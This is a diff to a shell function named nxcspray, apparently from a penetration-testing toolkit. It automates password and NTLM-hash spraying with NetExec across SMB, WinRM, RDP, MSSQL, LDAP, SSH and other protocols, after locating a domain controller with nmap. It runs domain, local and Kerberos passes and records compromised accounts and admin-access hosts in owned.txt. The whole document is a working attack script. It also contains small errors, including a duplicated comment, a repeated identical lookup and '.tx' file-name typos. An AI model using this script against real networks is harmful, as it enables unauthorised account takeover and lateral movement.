@@ -2353,45 +2353,53 @@ xssgen() {
 
 
 # NXC Spraying Wrapper
+# NXC Spraying Wrapper
 nxcspray(){
-
-    if [[ $# -eq 0 ]]; then
-        echo "Usage: nxcspray <target> <user> <pass|hash> {<domain>} {<DC FQDN>}"
-        return 1
-    fi
-    
-    dc_ip="$4"
-    dc_fqdn="$5"
     protocols=("smb" "winrm" "rdp" "mssql" "ldap" "vnc" "wmi" "nfs" "ftp" "ssh")
     loc_protocols=("smb" "winrm" "rdp" "mssql")
 
+    dc_ip=$(sudo nmap -p88 -iL $1 -n -Pn --disable-arp-ping -sT --open -oG - | awk '/88\/open/ {print $2}')
+    if [[ -z $dc_ip ]]; then
+        echo -e "\n[-] DC IP NOT FOUND, WILL SKIP KERBEROS AUTHENTICATION\n"
+    elif [[ $(echo $dc_ip | wc -l) != 1 ]]; then
+        read -r dc_ip\?"[-] MULTIPLE DC IPS DETECTED, INPUT MANUALLY: "
+    fi
+
+    dom=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $3}' | head -n 1)
+    if [[ -z $dom ]]; then
+        dom=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $3}' | head -n 1)
+    fi
+    echo -e "\n[+] DOMAIN SET TO \"$dom\"\n"
+
+    dc_fqdn=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $2}' | head -n 1)
+    rm /tmp/spray_$dc_fqdn.txt &>/dev/null
 
     echo -e "\n[+] - Domain Authentication"
     for protocol in "${protocols[@]}"; do
         if [[ $3 == $2 ]]; then
             echo -e "[+] - USER:USER Mode Detected\n"
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success --no-bruteforce | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
+            nxc $protocol $1 -u $2 -p $3 --continue-on-success --no-bruteforce | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
         elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol  $1 -u $2 -p $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
         else
-            nxc $protocol  $1 -u $2 -H $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
+            nxc $protocol  $1 -u $2 -H $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
         fi
-        cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
-        cat /tmp/spray_$1.txt | grep + | grep "SMB\|LDAP" | grep 'Pwn3d!' | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | grep "SMB\|LDAP" | grep 'Pwn3d!' | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
     done
 
     echo -e "\n[+] - Local Authentication"
     for protocol in "${loc_protocols[@]}"; do
         if [[ $3 == $2 ]]; then
             echo -e "[+] - USER:USER Mode Detected\n"
-            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
         elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
         else
-            nxc $protocol  $1 -u $2 -H $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
+            nxc $protocol  $1 -u $2 -H $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
         fi
-        cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
-        cat /tmp/spray_$1.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
     done
 
     if [[ ! -z $dc_fqdn ]]; then
@@ -2399,14 +2407,14 @@ nxcspray(){
         for protocol in "${protocols[@]}"; do
             if [[ $3 == $2 ]]; then
                 echo -e "[+] - USER:USER Mode Detected\n"
-                nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce -k --kdcHost $dc_fqdn  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
+                nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce -k --kdcHost $dc_fqdn  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
             elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-                nxc $protocol  $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
+                nxc $protocol  $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
             else
-                nxc $protocol  $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
+                nxc $protocol  $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
             fi
-            cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
-            cat /tmp/spray_$1.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+            cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+            cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
         done
     fi
 }
